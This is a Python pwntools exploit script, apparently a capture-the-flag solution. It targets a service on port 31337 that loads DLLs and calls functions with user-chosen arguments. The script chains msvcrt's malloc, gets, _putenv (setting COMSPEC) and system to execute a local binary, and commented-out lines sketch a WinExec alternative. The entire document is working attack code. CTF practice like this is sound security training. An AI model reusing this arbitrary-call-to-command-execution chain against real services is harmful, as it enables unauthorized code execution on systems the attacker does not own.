#!/usr/bin/env python3
from pwn import *
import os

context.log_level = "debug"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

io.sendlineafter(b"like to load?", b"C:\\Windows\\system32\\msvcrt.dll")
io.sendlineafter(b"want to call?", b"malloc")
io.sendlineafter(b"the first argument?", b"4096")
io.recvuntil(b"Result: ")
addr = int(io.recvuntil(b"\n", drop=True).decode(), 16)
print("addr:", hex(addr))

#addr = addr + 0x2800

io.sendlineafter(b"like to load?", b"C:\\Windows\\system32\\msvcrt.dll")
io.sendlineafter(b"want to call?", b"gets")
io.sendlineafter(b"the first argument?", str(addr).encode())

io.sendline(b"COMSPEC=./submitter")

io.sendlineafter(b"like to load?", b"C:\\Windows\\system32\\msvcrt.dll")
io.sendlineafter(b"want to call?", b"_putenv")
io.sendlineafter(b"the first argument?", str(addr).encode())


io.sendlineafter(b"like to load?", b"C:\\Windows\\system32\\msvcrt.dll")
io.sendlineafter(b"want to call?", b"gets")
io.sendlineafter(b"the first argument?", str(addr).encode())

io.sendline(b"./submitter")


io.sendlineafter(b"like to load?", b"C:\\Windows\\system32\\msvcrt.dll")
io.sendlineafter(b"want to call?", b"system")
io.sendlineafter(b"the first argument?", str(addr).encode())

#io.sendlineafter(b"like to load?", b"~/.wine/drive_c/windows/system32/kernel32.dll")
#io.sendlineafter(b"want to call?", b"winexec")
#io.sendlineafter(b"the first argument?", str(addr).encode())

_data = io.recvall(timeout=3)
print(_data)
